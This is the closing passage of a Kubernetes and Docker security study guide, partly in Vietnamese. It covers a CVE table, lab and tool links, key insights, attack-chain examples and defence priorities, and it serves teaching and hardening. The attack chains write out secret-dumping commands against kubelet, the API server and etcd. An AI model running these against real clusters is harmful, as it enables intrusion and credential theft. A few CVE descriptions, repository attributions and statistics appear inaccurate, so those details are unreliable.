- **Rhino Security Labs:** https://rhinosecuritylabs.com/ — Cloud & K8s pentesting
- **CyberArk Blog:** https://www.cyberark.com/blog/ — Container security, kubeletctl

### 75. Key CVEs

| CVE | Component | Impact | Fix |
|-----|-----------|--------|-----|
| **CVE-2019-5736** | runC | Container escape to host | Docker 18.09.2+, runC 1.0-rc6+ |
| **CVE-2019-11246** | kubectl cp | Path traversal, file overwrite | K8s 1.12.9+, 1.13.6+, 1.14.2+ |
| **CVE-2019-11253** | kube-apiserver | JSON/YAML DoS | K8s 1.13.10+, 1.14.6+, 1.15.3+ |
| **CVE-2020-8554** | Kubernetes Services | MITM via ExternalIP | K8s 1.18.6+, 1.19.1+ |
| **CVE-2020-8555** | kube-controller-manager | SSRF | K8s 1.17.9+, 1.18.6+, 1.19.1+ |
| **CVE-2020-8558** | kube-proxy | Node traffic interception | K8s 1.17.10+, 1.18.7+, 1.19.2+ |
| **CVE-2020-8559** | kube-apiserver | Privilege escalation via patch | K8s 1.17.10+, 1.18.7+, 1.19.2+ |
| **CVE-2021-25741** | Subpath | Symlink hostPath bypass | K8s 1.21.1+, 1.20.7+, 1.19.11+ |
| **CVE-2022-0185** | Linux kernel (pipe) | Container escape via insufficient check | Linux 5.17+, updated Docker |
| **CVE-2022-0492** | cgroup v1 | Container escape via release_agent | Linux 5.19+, cgroup v2 |
| **CVE-2023-25173** | containerd | Supplementary groups bypass | containerd 1.6.18+, 1.5.18+ |
| **CVE-2023-2727** | kube-apiserver | Service account bypass | K8s 1.24.14+, 1.25.9+, etc. |
| **CVE-2023-3676** | kubelet | Volume mount race condition | K8s 1.28.1+ |

### 76. YouTube Channels & Talks

- **KubeCon + CloudNativeCon** — Official K8s conference talks
- **CNCF [The Linux Foundation]** — Security-related webinars
- **Aqua Security** — Product demos + security talks
- **Sysdig** — Falco + container security
- **Hacking Kubernetes** — Andrew Martin's talks
- **OWASP** — K8s Top 10 presentations
- **Ian Coldwater** — K8s security talks (KubeCon)
- **Brad Geesaman** — Container security talks
- **Duffie Cooley** — K8s networking + security

### 77. Labs & Practice Environments

| Resource | URL | Description |
|----------|-----|-------------|
| **Kubernetes Goat** | https://github.com/madhuakula/kubernetes-goat | Interactive K8s security playground |
| **Damn Vulnerable Kubernetes** | https://github.com/snyk/dvkubernetes | Vulnerable K8s cluster |
| **Kube-Hunter** | https://github.com/aquasecurity/kube-hunter | Automated scanning |
| **Kubescape** | https://github.com/armosec/kubescape | Compliance scanner |
| **Popeye** | https://github.com/derailed/popeye | Cluster health |
| **kube-bench** | https://github.com/aquasecurity/kube-bench | CIS benchmark |
| **Peirates** | https://github.com/inguardians/peirates | K8s pentesting |
| **KubePwn** | https://github.com/0x4D31/kubepwn | CTF-focused exploitation |
| **Kubeletctl** | https://github.com/cyberark/kubeletctl | Kubelet API interaction |
| **Falco** | https://github.com/falcosecurity/falco | Runtime security |
| **Tracee** | https://github.com/aquasecurity/tracee | Runtime tracing |
| **Bad Pods** | https://github.com/SpiderLabs/badpod | K8s pod exploitation guide |
| **Kubernetes Security Workshop** | https://github.com/aquasecurity/kube-sec-workshop | Learning workshop |

---

## L. KEY INSIGHTS

### 78. Synthesis Realizations

**1. Container không phải máy ảo**
- Đây là insight QUAN TRỌNG NHẤT. Container chỉ là process với namespaces.
- Một process chạy với --privileged gần như tương đương process chạy với root trên host.
- Namespaces cô lập NHIỀU nhưng KHÔNG cô lập HOÀN TOÀN.
- Kernel exploits vẫn ảnh hưởng host → kernel là shared surface.

**2. Docker socket = root on host**
- Bất kỳ ai có access vào `/var/run/docker.sock` đều có root trên host.
- Over 90% của container escapes đến từ docker socket mounted inside container.
- Rule: KHÔNG BAO GIỜ mount docker.sock vào container.

**3. Kubernetes security model phụ thuộc hoàn toàn vào RBAC**
- RBAC là tuyến phòng thủ CHÍNH trong K8s.
- Một service account với `create pod` + `list secrets` = cluster compromise.
- `cluster-admin` + `system:anonymous` = mọi người đều là admin.
- RBAC auditing là bước đầu tiên trong mọi pentest.

**4. kubelet API là blind spot phổ biến**
- Port 10250 thường bị bỏ quên trong config.
- Anonymous auth trên kubelet = RCE trên node.
- kubelet cert thường có quyền cao trên API server.
- Trong cloud-managed K8s (EKS, GKE, AKS), kubelet thường an toàn hơn.

**5. HostPath vẫn là một trong những cách leo quyền đơn giản nhất**
- `hostPath: /` + `privileged: true` = root on node.
- Nếu có thể tạo pod với hostPath, hầu như luôn có thể compromise node.
- PSA/OPA thường không chặn hostPath trong many clusters.

**6. Supply chain > Infrastructure**
- Tấn công vào base image, package dependency, CI/CD pipeline thường hiệu quả hơn tấn công trực tiếp vào cluster infrastructure.
- Docker Hub images không ai kiểm tra security.
- Một malicious npm package → compromise toàn bộ pipeline → cluster.

**7. etcd là mục tiêu giá trị nhất**
- etcd chứa TOÀN BỘ cluster state, bao gồm secrets, keys, tokens.
- Nếu etcd không có auth (hoặc cert bị leak), attacker có full cluster control.
- Trong managed K8s (EKS/GKE/AKS), etcd được manage — ít rủi ro hơn.
- Trong self-hosted clusters, etcd thường là weak link.

**8. Service account tokens là xương sống của K8s attacks**
- Mọi pod đều có SA token mounted mặc định.
- Token này có thể access API server.
- Bound tokens (K8s 1.24+) giảm thiểu rủi ro, nhưng legacy tokens vẫn tồn tại.
- Token theft → privilege escalation nếu SA có nhiều permissions.

**9. Webhook là backdoor hoàn hảo**
- MutatingAdmissionWebhook có thể thay đổi MỌI resource created.
- ValidatingAdmissionWebhook có thể chặn security controls.
- Webhook persistence rất khó detect vì ít người check webhook configs.
- Một webhook với `failurePolicy: Ignore` có thể silently modify pods.

**10. Defense in depth là bắt buộc**
- Không single layer nào đủ mạnh để bảo vệ K8s cluster.
- Cần kết hợp: RBAC + NetworkPolicy + PSA/OPA + runtime security + image scanning.
- Principle of least privilege áp dụng cho: SA, network, capabilities, volumes.
- "Shift left" security: kiểm tra security ngay từ Dockerfile và CI/CD.

### 79. Connections to Cloud/Network Pentest Knowledge

**Docker/K8s Security + Cloud Pentest:**

| Cloud Pentest Concept | K8s Equivalent |
|----------------------|-----------------|
| IAM roles | ServiceAccounts |
| Security Groups / NACL | NetworkPolicy |
| S3 bucket policies | RBAC ClusterRole |
| KMS/SSM parameter store | Secrets + ConfigMaps |
| VPC Flow Logs | Audit Logs + NetworkPolicy |
| CloudTrail | Audit logging (API server) |
| GuardDuty | Falco + Tracee |
| WAF | OPA/Gatekeeper (admission control) |
| AMI hardening | Container image scanning |
| SSRF via metadata service | Pod to API server communication |
| Cloud provider metadata | Cloud-specific K8s integration (IAM for SA) |

**Docker/K8s Security + Network Pentest:**

| Network Pentest Concept | K8s Equivalent |
|------------------------|-----------------|
| Lateral movement | Pod-to-pod communication |
| Pivoting | Pod exec + kubelet API |
| Port knocking | Service + Ingress |
| DNS poisoning | CoreDNS manipulation |
| ARP spoofing | NetworkPolicy bypass (no CNI) |
| Man-in-the-middle | Sidecar injection |
| Service discovery | DNS-based (CoreDNS) |
| Firewall evasion | HostNetwork pods |
| Reverse shell | kubectl exec + container escape |
| Credential dumping | Secret enumeration + etcd dump |

**Tool mapping from other domains:**
- **Nmap →** kubeletctl, kube-hunter (K8s scanning)
- **Burp Suite →** API server interaction (curl + kubectl)
- **BloodHound →** RBAC enumeration + k9s access matrix
- **Metasploit →** Peirates (K8s exploitation framework)
- **Mimikatz →** Secret extraction from etcd/pods
- **C2 framework →** CronJob + DaemonSet persistence
- **Webshell →** Pod exec + sidecar injection
- **Persistence →** backdoor DaemonSet, webhook, RBAC
- **Lateral →** kubelet API, pod-to-pod network

### 80. Attack Chain Examples

**Example 1: Supply Chain → Cluster Compromise**
```
Malicious npm package
    ↓
Compromises CI/CD pipeline (GitHub Actions)
    ↓
Steals Docker credentials from CI secrets
    ↓
Pushes malicious image to registry
    ↓
Image deployed to K8s cluster
    ↓
Container with hostPath + docker.sock
    ↓
Container escapes to node
    ↓
Steals kubelet cert / admin.conf
    ↓
Access API server as cluster-admin
    ↓
Full cluster compromise → Data exfiltration
```

**Example 2: Unauthenticated kubelet → RCE**
```
Scan CIDR → Find node:10250 open
    ↓
Check if kubelet accepts anonymous auth
    ↓
curl https://node:10250/pods → Pod list!
    ↓
kubeletctl exec with command → RCE on node
    ↓
Extract node kubelet client cert
    ↓
Use cert to access API server
    ↓
kubectl get secrets --all-namespaces
    ↓
Steal cluster-admin token from kube-system
    ↓
Full cluster control
```

**Example 3: RBAC Misconfiguration → Privilege Escalation**
```
Compromise pod (web app RCE)
    ↓
Check SA token permissions
    ↓
SA has: create pods + serviceaccount/find
    ↓
Find privileged SA "admin-sa" in kube-system
    ↓
Create pod with admin-sa service account
    ↓
Pod has cluster-admin permissions
    ↓
kubectl get secrets --all-namespaces
    ↓
Extract cloud provider credentials from secrets
    ↓
Use cloud creds to access cloud console
```

**Example 4: etcd No Auth → Cluster Takeover**
```
Network scan → Find etcd:2379 open
    ↓
etcdctl endpoint health → Healthy!
    ↓
etcdctl get /registry/secrets --prefix
    ↓
Extract all secrets
    ↓
Find service account token from secrets
    ↓
Use token to access API server
    ↓
Token has cluster-admin permissions
    ↓
Full cluster compromise
```

### 81. Defense Priorities (By Impact)

**Priority 1 — Critical:**
1. Disable anonymous auth everywhere (API server + kubelet)
2. Enable RBAC and audit default roles/bindings
3. Don't use privileged containers (disable creation via PSA)
4. Don't mount docker.sock into containers
5. Enable etcd auth + TLS
6. Audit all service account permissions

**Priority 2 — High:**
7. Enable NetworkPolicy (default deny)
8. Use Pod Security Admission (restricted profile)
9. Enable audit logging for API server
10. Scan images in CI/CD pipeline (pre-deployment)
11. Use image signing (Cosign)
12. Implement admission controllers (OPA/Kyverno)
13. Remove unused default SA permissions
14. Use read-only root filesystem for containers

**Priority 3 — Medium:**
15. Enable Seccomp (default Docker profile)
16. Enable AppArmor/SELinux
17. Use user namespace remapping
18. Implement runtime security (Falco)
19. Regular CIS benchmark checks
20. Secret encryption at rest
21. Regular vulnerability scanning
22. Pod resource limits

**Priority 4 — Low:**
23. Service mesh (mTLS)
24. Container runtime sandboxing (gVisor, Kata)
25. Honeypots in cluster
26. HIDS on nodes

---

> **Tài liệu này được tổng hợp từ nhiều nguồn:**
> - Kubernetes official documentation
> - OWASP Kubernetes Top 10
> - NSA/CISA Kubernetes Hardening Guide
> - CIS Kubernetes Benchmark
> - Aqua Security research blog
> - Control Plane (Arkose Labs) research
> - MITRE ATT&CK for Containers
> - Falco documentation
> - CKS exam syllabus & study materials
> - KubeCon talks & workshops (2019-2025)
> - Thực tiễn pentest K8s cluster

**Version:** v1.0 | **Last Updated:** 2026-05-26

---

*"In the world of containers, isolation is just namespaces away from escape. Never trust the boundary, always audit the access."*
